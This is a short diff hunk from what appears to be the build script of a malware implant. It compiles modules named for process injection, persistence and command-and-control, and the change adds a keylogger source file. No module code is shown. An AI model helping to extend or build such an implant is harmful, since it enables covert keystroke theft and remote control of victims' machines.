@@ -158,6 +158,7 @@ echo "[*] Compiling $IMPLANT_OUT …"
     src/injection.cpp    \
     src/persistence.cpp  \
     src/c2.cpp           \
+    src/keylog.cpp       \
     src/utils.cpp        \
     "$OUT_DIR/ghost.res" \
     -lntdll              \
